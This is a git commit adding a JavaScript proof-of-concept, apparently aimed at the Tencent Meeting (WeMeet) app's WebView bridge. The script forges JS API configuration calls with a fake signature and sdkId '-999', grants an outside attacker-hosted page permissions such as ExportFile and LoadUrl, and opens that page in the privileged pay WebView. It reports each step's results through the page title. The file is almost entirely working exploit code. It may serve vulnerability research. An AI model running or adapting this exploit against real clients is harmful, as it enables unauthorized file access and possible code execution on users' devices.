32b7ff03cbf12c0e6651a228119f005ece034f6c
whs <401056294@qq.com>
2026-09-06 06:36:42 -0400

    p132: leftover SetOpenJsApiConfig+JsApiConfig sdkId-999 attacker url then MAIN Pay ExportFile

---
+++ p132pay.js
@@ -0,0 +1,49 @@
+(function(){
+  document.title='P132TB:'+location.host;
+  window.__p=function(r){
+    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+    document.title='P132CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
+  };
+  function c(id,mod,m,p){
+    try{
+      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+        callback:'window.__p',module:mod,method:m,param:p,callId:id
+      }));
+    }catch(e){
+      document.title='P132TB-NOJS:'+location.host;
+    }
+  }
+  if(!window.JSCallJavaMgr){document.title='P132TB-NOMGR:'+location.host;return}
+  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+  var att='https://gitwhs.github.io/wm-poc-rce/p132atk.html';
+  var sch='wemeet://page/pay/main_process_webview';
+  var cfg={
+    url:att,
+    corpId:'1',
+    timestamp:'1',
+    nonceStr:'a',
+    signature:'a',
+    sdkId:'-999',
+    jsApiList:['ExportFile','LoadUrl','OpenNewPage','LoadTemplateWebView']
+  };
+  var q=[
+    ['H2','CommonPlugin','GetPerformance',{}],
+    ['GI','OpenApiPlugin','GetOpenAppInfo',{}],
+    ['SOC','OpenApiPlugin','SetOpenJsApiConfig',cfg],
+    ['JC','OpenApiPlugin','JsApiConfig',cfg],
+    ['CK','OpenApiPlugin','CheckJsApiConfig',{url:att}],
+    ['OP','CommonPlugin','OpenNewPage',{
+      scheme:sch,
+      router_params:{url:att}
+    }]
+  ];
+  var i=0;
+  function n(){
+    if(i>=q.length){document.title='P132TB-DONE:'+location.host;return}
+    var x=q[i++];
+    document.title='P132-RUN:'+x[0];
+    c(x[0],x[1],x[2],x[3]);
+    setTimeout(n, 3500);
+  }
+  setTimeout(n, 800);
+})();
